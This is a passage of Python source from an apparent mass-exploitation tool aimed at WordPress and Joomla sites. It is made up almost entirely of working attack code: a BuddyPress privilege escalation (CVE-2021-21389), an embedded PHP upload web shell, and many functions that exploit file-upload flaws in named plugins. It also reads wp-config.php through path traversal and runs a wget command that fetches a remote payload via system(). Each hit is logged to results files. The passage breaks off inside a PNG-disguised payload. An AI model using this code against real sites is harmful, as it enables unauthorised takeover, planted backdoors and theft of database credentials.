            'save': (None, 'Create Group and Continue')
        }
        s.post('http://' + url + "/groups/create/step/group-details/", files=files)
        resp = s.get(url + "/groups/" + group_name + "/admin/manage-members/")
        wp_nonce = re.findall('var wpApiSettings = .*\;', resp.text)
        wp_nonce = re.sub('^.*\"nonce\"\:\"', '', wp_nonce[0])
        x_wp_nonce = re.sub('\".*$', '', wp_nonce)
        return x_wp_nonce
    except:
        return None

def privilegeEscalation(url, s, x_wp_nonce):
    url = url.strip()
    url = re.sub(r'https?://', '', url)
    headerx = {
        'X-WP-Nonce': x_wp_nonce,
        "Content-Type": "application/json; charset=UTF-8"
    }
    data = {
        "roles": "administrator"
    }
    try:
        s.post('http://' + url + "/wp-json/buddypress/v1/members/me", headers=headerx, data=dumps(data))
    except:
        pass

def Exploit_CVE_2021_21389(domain):
    username = 'AXV1337@user'
    password = 'AXV1337@pass'
    register(domain, username, password)
    sess = Wp_login(domain, username, password)
    x_wp_nonce = createNewgroup(domain, sess, username)
    privilegeEscalation(domain, sess, x_wp_nonce)

##############
php = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.php'
index = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.php5'
shell_2 = """GIF89a <?php echo 'AXVTECH'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_name = str(time.time())[:-3]
shell = """GIF89a <?php echo 'AXVTECH'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filenamex = "AXV_" + str(shell_name) + ".php.php"
phtml = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.phtml'
filename = "AXV_" + shell_name + ".php"
nik = 'modules/0KemYggJIdGfpf5i42FN/shells/root.php'
index = 'modules/0KemYggJIdGfpf5i42FN/shells/axv.php5'
tahun = datetime.now().year
bulan = datetime.now().month
def rand_str(len=None):
    if len == None:
        len = 8
    return ''.join(rand('abcdefghijklmnopqrstuvwxyz', len))    

filenames = "AXV" + rand_str(5) + ".php"

########## ONEEE ############
def HeadwayTheme(domain):
    try:
        domain = ''.join(domain)
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        CheckTheme = requests.get('http://' + domain, timeout=10, headers=ua, verify=False)
        if '/wp-content/themes/headway' in str(CheckTheme.text):
            ThemePath = re.findall(r'/wp-content/themes/(.*)/style.css', str(CheckTheme.text))
            ShellFile = {'Filedata': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
            url = 'https://' + domain + '/wp-content/themes/' + ThemePath[0] + '/library/visual-editor/lib/upload-header.php'
            Check = requests.get(url, timeout=10, headers=ua, verify=False)
            if Check.status_code == 200:
                GoT = requests.post(url, files=ShellFile, headers=ua, verify=False, timeout=30)
                if GoT.status_code == 200:
                    Shell_URL = 'http://' + domain + '/wp-content/uploads/headway/header-uploads/axv.php'
                    requests.get(Shell_URL, timeout=10, headers=ua, verify=False)
                    CheckShell = requests.get('http://' + domain + '/wp-content/axv.php', timeout=10, headers=ua, verify=False)
                    if 'AXVTECH' in CheckShell.text:
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}Headway Theme -->> {green}Exploited !")
                        open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/axv.php\n")
                    else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Headway Theme -->> {red}Failed Exploit !")
                else:pass
            else:pass
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Headway Theme -->> {red}Not Vuln !")
    except:pass
    
def Showbizapp(domain):
    try:
        showbizapp = {'action': 'showbiz_ajax_action', 'client_action': 'update_plugin'}
        showbizup = {'update_file': (filenames, shell, 'text/html')}
        requests.post("https://" + domain + '/wp-admin/admin-ajax.php', data=showbizapp, files=showbizup, headers=ua, timeout=30)
        showbizlib = requests.get("http://" + domain + '/wp-content/plugins/showbiz/temp/update_extract/' + filenames, headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in showbizlib.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Show-Biz -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Show-Biz -->> {red}Not Vuln !")
    except:pass
    
def XD(domain):
    try:
        vuln_url = "https://" + domain + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../' + filename
        requests.post(vuln_url, data=shell, headers=ua, timeout=30, verify=False)
        check_lib = requests.get("http://" + domain + '/components/' + filename, headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in check_lib.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}B2jContact -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/components/' + filename + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}B2jContact -->> {red}Failed Exploit !")
    except:pass
    
def LearnDashup(domain):
        try:
            LearnDashup = {'uploadfiles[]': (filenamex, shell, 'text/html')}
            requests.post("https://" + domain, files=LearnDashup, data={'post': 'foobar', 'course_id': 'foobar', 'uploadfile': 'foobar'}, headers=ua, timeout=20, verify=False)
            LearnDashlib = requests.get("https://" + domain + '/wp-content/uploads/assignments/' + filenamex.replace('.php.php', '.php'), headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in LearnDashlib.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}LearnDash -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/wp-content/uploads/assignments/' + filenamex.replace('.php.php', '.php') + '\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}LearnDash -->> {red}Failed Exploit !")
        except:pass
        
def Cherryup(domain):
    try:
        Cherryup = {'file': (filenames, shell, 'text/html')}
        requests.post("https://" + domain + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup, headers=ua, timeout=20, verify=False)
        Cherrylib = requests.get("http://" + domain + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames, headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in Cherrylib.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cherry-Plugins -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cherry-Plugins -->> {red}Failed Exploit !")
    except:pass
    
def ReflexGallery(domain):
    try:
        CheckVULN = requests.get("http://" + domain + '/components/com_sexycontactform/fileupload/', headers=ua, timeout=10,verify=False)
        if CheckVULN.status_code == 200:
            Reflexup = {'files[]': open(nik, 'rb')}
            requests.post("https://" + domain + '/components/com_sexycontactform/fileupload/', files=Reflexup, headers=ua, timeout=20, verify=False)
            Reflexlib = requests.get("http://" + domain + '/com_sexycontactform/fileupload/files/root.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in Reflexlib.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_sexycontactform -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/com_sexycontactform/fileupload/files/root.php' + '\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_sexycontactform -->> {red}Failed Exploit !")

            check_fabrik = requests.get("http://" + domain + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', headers=ua, timeout=10, verify=False)
            if 'filepath":"' in check_fabrik.text:
                com_fabrik = {'file': (filename, shell, 'text/html')}
                requests.post("https://" + domain + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', files=com_fabrik, headers=ua, timeout=20, verify=False)
                Shell_fabrik = requests.get("http://" + domain + '/' + str(filename), headers=ua, timeout=10, verify=False)
                if 'AXVTECH' in Shell_fabrik.text:
                    print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Fabrik -->> {green}Exploited !")
                    open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/' + str(filename) + '\n')
                else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Fabrik -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com_Fabrik -->> {red}Not Vuln !")
    except:pass

def Reflexupx(domain):
    try:
        Reflexupx = {'qqfile': (filenames, shell_2, 'text/html')}
        requests.post("https://" + domain + '/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01',files=Reflexupx, headers=ua, timeout=20, verify=False)
        Reflexlibx = requests.get("http://" + domain + '/wp-content/uploads/2018/01/' + filenames, headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in Reflexlibx.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Reflex-Gallery -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/wp-content/uploads/2018/01/' + filenames + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Reflex-Gallery -->> {red}Failed Exploit !")
    except:pass
    
def Wysijaup(domain):
    try:
        Wysijaup = {'my-theme': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.zip', 'rb')}
        Wysijaapp = {'action': 'themeupload','submitter': 'Upload','overwriteexistingtheme': 'on','page': 'GZNeFLoZAb'}
        wypost = requests.post("https://" + domain + '/wp-admin/admin-post.php?page=wysija_campaigns&action=themes', data=Wysijaapp, files=Wysijaup, headers=ua, timeout=20,verify=False)
        if wypost.status_code == 200:
            Wysijalib = requests.get("http://" + domain + '/wp-content/uploads/wysija/themes/axv/axv.php', headers=ua, timeout=10,verify=False)
            if 'AXVTECH' in Wysijalib.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wysija -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/wp-content/uploads/wysija/themes/axv/axv.php' + '\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wysija -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wysija -->> {red}Not Vuln !")
    except:pass
    
def DbConfig(domain):
    try:
        ri = requests.get("http://" + domain + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', headers=ua, timeout=20, verify=False)
        if 'DB_USER' in ri.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Configs -->> {green}DOWNLOADED WITH SUCCESS !")
            open('results/ConfigsForCPs.txt', 'a+').write("http://" + domain + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Configs -->> {red}Failed !")
    except:pass
    
def Com_jce(domain):
    try:
        fgappgravkg = {'upload-dir': '../../','upload-overwrite': '0','action': 'upload'}
        fgGravkg = {'Filedata': open(nik, 'rb')}
        requests.post("https://" + domain + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', data=fgappgravkg, files=fgGravkg, headers=ua, timeout=20,verify=False)
        fgGravkglib = requests.get("http://" + domain + '/root.php', headers=ua, timeout=10,verify=False)
        if 'AXVTECH' in fgGravkglib.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jce -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/root.php' + '\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jce -->> {red}Failed Exploit !")
    except:pass
    
def Wpms(domain):
    try:
        fileswp_ms = {'file' : ( "config.json.php", open("modules/0KemYggJIdGfpf5i42FN/shells/root.php"), "application/json" )}
        wpms = requests.post('https://' + domain + '/wp-json/api/flutter_woo/config_file',files=fileswp_ms, headers=ua, timeout=30, verify=False)
        if wpms.status_code == 200:
            wpms_cekshell = requests.get(f"http://{domain}/wp-content/uploads/{tahun}/{bulan}/config.json.php", headers=ua, timeout=10, verify=False).text
            if 'AXVTECH' in wpms_cekshell:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_MS -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"http://{domain}/wp-content/uploads/{tahun}/{bulan}/config.json.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_MS -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_MS -->> {red}Not Vuln !")
    except:pass
    
def WpDown(domain):
    try:
        get_sole = requests.get(f"http://{domain}", headers=ua, timeout=10, verify=False, allow_redirects=False).text
        if "pie-register" in get_sole or "pie_notice_" in get_sole:
            wp_dwnldReq = requests.session()
            wp_dwnldData = {'user_id_social_site': '1','social_site': 'true','_wp_http_referer':'/login/','log': 'null','pwd':'null'}
            wp_dwnldPost = wp_dwnldReq.post(f"https://{domain}", data=wp_dwnldData, headers=ua, timeout=15, verify=False, allow_redirects=False)
            if wp_dwnldPost.status_code == 302:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}PIE-REGISTER -->> {green}Exploited !")
                open('results/pie-register.txt', 'a+').write(f"http://{domain}\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PIE-REGISTER -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PIE-REGISTER -->> {red}Not Vuln !")
    except:pass

def Wp_p3d(domain):
    try:
        cekvlnwp_p3d = requests.get(f"http://{domain}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload", headers=ua, timeout=10, verify=False).text
        if "jsonrpc" in cekvlnwp_p3d:
            files_p3d = {'file' : open("modules/0KemYggJIdGfpf5i42FN/shells/root.php")}
            wp_p3d = requests.post(f"https://{domain}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload", files=files_p3d, headers=ua, timeout=20, verify=False, allow_redirects=False).text
            wp_p3dCek = requests.get(f"http://{domain}/wp-content/uploads/p3d/root.php").text
            if "root.php" in wp_p3d or 'AXVTECH' in wp_p3dCek:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_P3D -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"http://{domain}/wp-content/uploads/p3d/root.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_P3D -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_P3D -->> {red}Not Vuln !")
    except:pass
    
def Wp_adning(domain):
    try:
        wpadCekVuln = requests.get(f"http://{domain}/wp-admin/admin-ajax.php?action=_ning_upload_image", headers=ua, timeout=10, verify=False).text
        if "no files found" in wpadCekVuln:
            files_wpAdning = {'files[]' : open("modules/0KemYggJIdGfpf5i42FN/shells/root.php")}
            data_wpAdning = {"allowed_file_types" : "php,jpg,jpeg","upload" : json.dumps({"dir" : "../"})}
            wp_adningPost = requests.post(f"https://{domain}/wp-admin/admin-ajax.php?action=_ning_upload_image", files=files_wpAdning, data=data_wpAdning, headers=ua, timeout=20, verify=False, allow_redirects=False).text
            if "root.php" in wp_adningPost:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_ADNING -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(f"http://{domain}/root.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_ADNING -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP_ADNING -->> {red}Not Vuln !")
    except:pass
    
def Zoom(domain):
    try:
        dataex1 = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')
        listenex1 = domain + '/wp-content/plugins/dzs-zoomsounds/savepng.php?location=axv.php'
        dirrex1 = domain + '/wp-content/plugins/dzs-zoomsounds/axv.php'
        requests.post('https://' + listenex1, data=dataex1, headers=ua, verify=False, timeout=30)
        cekshellEX1 = requests.get(f"http://{dirrex1}", headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in cekshellEX1:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}ZOOM -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"http://{dirrex1}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}ZOOM -->> {red}Not Vuln !")
    except:pass
    
def Ioptimizations(domain):
    try:
        listEX2 = f"https://{domain}/wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd"
        dirEX2 = f"http://{domain}/wp-content/plugins/ioptimizations/axv.php"
        dataEX2 = {'1': 'axv.php'}
        filesEX2 = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(listEX2, data=dataEX2, files=filesEX2, headers=ua, verify=False, timeout=20)
        getEX2 = requests.get(dirEX2, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in getEX2:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Ioptimizations -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dirEX2}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Ioptimizations -->> {red}Not Vuln !")
    except:pass
    
def Ioptimizations2(domain):
    try:
        dirrEX3 = f'http://{domain}/wp-content/plugins/ioptimization/axv.php'
        uEX3 = f'https://{domain}/wp-content/plugins/ioptimization/IOptimize.php?rchk'
        dataEX3 = {'1': 'axv.php'}
        filesEX3 = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(uEX3, data=dataEX3, files=filesEX3, headers=ua, verify=False, timeout=20)
        getEX3 = requests.get(dirrEX3, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in getEX3:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Ioptimizations2 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dirrEX3}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Ioptimizations2 -->> {red}Not Vuln !")
    except:pass
    
def Engine(domain):
    try:
        filesEX4 = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        dataEX4 = {'filename': 'axv.php'}
        dirrrEX4 = f'http://{domain}/wp-content/plugins/wp-engine-module/axv.php'
        linkEX4 = f'https://{domain}/wp-content/plugins/wp-engine-module/wp-engine.php'
        requests.post(linkEX4, data=dataEX4, files=filesEX4, headers=ua, verify=False, timeout=20)
        getEX4 = requests.get(dirrrEX4, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in getEX4:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Engine -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dirrrEX4}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Engine -->> {red}Not Vuln !")
    except:pass
    
def KasWara(domain):
    try:
        targetEX5 = f'https://{domain}/wp-admin/admin-ajax.php?action=uploadFontIcon'
        dirrrEX5 = f'http://{domain}/wp-content/uploads/kaswara/fonts_icon/axv/.__axv.php'
        filesEX5 = {'fonticonzipfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.zip', 'rb')}
        dataEX5 = {'action': 'uploadFontIcon', 'fontsetname': 'axv', 'fonticonzipfile': 'uploadFontIcon'}
        requests.post(targetEX5, data=dataEX5, files=filesEX5, headers=ua, verify=False, timeout=20)
        getEX5 = requests.get(dirrrEX5, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in getEX5:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}KasWara -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dirrrEX5}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}KasWara -->> {red}Not Vuln !")
    except:pass

def Apikey(domain):
    try:
        filedataEX6 = {'filename': ('axv.php', shell, 'text/html')}
        vuln_directoryEX6 = f'https://{domain}/wp-content/plugins/apikey/apikey.php'
        shell_dirEX6 = f'http://{domain}/wp-content/plugins/apikey/axv.php'
        requests.post(vuln_directoryEX6, files=filedataEX6, headers=ua, verify=False, timeout=20)
        sourceEX6 = requests.get(shell_dirEX6, headers=ua, verify=False, timeout=10).text
        if 'AXVTECH' in sourceEX6:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}APIKEY -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell_dirEX6}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}APIKEY -->> {red}Not Vuln !")
    except:pass
    
def Cherry(domain):
    try:
        CherryupEX7 = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        vuln_dirEX7 = f'http://{domain}/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
        dir_shellEX7 = f'https://{domain}/wp-content/plugins/cherry-plugin/admin/import-export/axv.php'
        requests.post(vuln_dirEX7, files=CherryupEX7, headers=ua, verify=False, timeout=20)
        send_sourceEX7 = requests.get(dir_shellEX7, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in send_sourceEX7:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cherry -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dir_shellEX7}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Cherry -->> {red}Not Vuln !")
    except:pass
    
def FormCraft(domain):
    try:
        formcraftupEX8 = {'files[]': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        vuln_dirEX8 = f"https://{domain}/wp-content/plugins/formcraft/file-upload/server/php/"
        shell_dirEX8 = f'http://{domain}/wp-content/plugins/formcraft/file-upload/server/php/files/axv.php'
        requests.post(vuln_dirEX8, files=formcraftupEX8, headers=ua, verify=False, timeout=20)
        send_sourceEX8 = requests.get(shell_dirEX8, headers=ua, verify=False, timeout=10).text
        if 'AXVTECH' in send_sourceEX8:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}FormCraft -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell_dirEX8}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}FormCraft -->> {red}Not Vuln !")
    except:pass

def Typehub(domain):
    try:
        dataEX9 = {'action': 'add_custom_font'}
        filesEX9 = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.zip', 'rb')}
        dirrEX9 = f'http://{domain}/wp-content/uploads/typehub/custom/axv/.__axv.php'
        targetEX9 = f'https://{domain}/wp-admin/admin-ajax.php'
        requests.post(targetEX9, data=dataEX9, files=filesEX9, headers=ua, verify=False, timeout=20)
        get_contentEX9 = requests.get(dirrEX9, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in get_contentEX9:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}TYPEHUB -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{dirrEX9}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}TYPEHUB -->> {red}Not Vuln !")
    except:pass
    
def Gallery(domain):
    try:
        filesEX10 = {'myfile[]': ('axvtech.php4', shell, 'text/plain')}
        dataEX10 = {'action':'gallery_from_files_595_fileupload', 'filesName':'myfile', 'allowExt':'php4', 'uploadDir':'/var/www/'}
        shell_dirEX10 = f'http://{domain}/axvtech.php4'
        vuln_pathEX10 = f'https://{domain}/wp-admin/admin-ajax.php'
        requests.post(vuln_pathEX10, files=filesEX10, data=dataEX10, headers=ua, verify=False, timeout=20)
        get_contentEX10 = requests.get(shell_dirEX10, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in get_contentEX10:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gallery -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell_dirEX10}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gallery -->> {red}Not Vuln !")
    except:pass
    
def Wpcargo(domain):
    try:
        sessionEX11 = requests.session()
        dataEX11 = {"2": "wget https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/wkwk27.txt -O axvtech.php"}
        payloadEX11 = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
        shell_dirEX11 = f'http://{domain}/wp-content/axvtech.php'
        targetEX11 = f'http://{domain}/wp-content/plugins/wpcargo/includes/barcode.php?text='+payloadEX11+'&sizefactor=.090909090909&size=1&filepath=../../../x.php'
        send = sessionEX11.get(targetEX11, headers=ua, verify=False, timeout=15)
        sessionEX11.post(f'https://{domain}/wp-content/x.php?1=system', data=dataEX11, headers=ua, verify=False, timeout=20)
        get_shellEX11 = sessionEX11.get(shell_dirEX11, headers=ua, verify=False, timeout=15).text
        if 'AXVUPLOADER' in get_shellEX11:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}WPCARGO -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell_dirEX11}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WPCARGO -->> {red}Not Vuln !")
        sessionEX11.close()
    except:pass
    
def WfPFILEMANAGER(domain):
    try:
        domainEX12 = f"https://{domain}/wp-content/plugins/wp-file-manager-pro/lib/php/connector.minimal.php"
        filenameEX12 = 'axv.php'
        filedataEX12 = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"" + filename + "\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 